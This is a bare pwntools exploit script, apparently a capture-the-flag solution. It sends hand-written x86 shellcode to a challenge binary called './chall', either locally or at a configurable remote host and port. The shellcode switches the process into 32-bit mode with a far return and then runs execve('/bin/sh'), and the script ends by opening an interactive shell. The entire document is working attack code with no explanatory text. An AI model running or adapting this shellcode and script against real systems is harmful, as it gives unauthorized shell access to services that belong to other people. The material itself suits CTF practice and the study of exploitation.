#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './chall'
LIBC_FILE = ''

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def attack(io):
    shellcode = b'\x48\x31\xe4\xbc\x88\x40\x40\x00\xc7\x04\x24\x18\x00\x42\x69\xc7\x44\x24\x04\x23\x00\x00\x00\xcb'\
                b'\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80'
    io.recvline()
    io.sendline(shellcode)

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
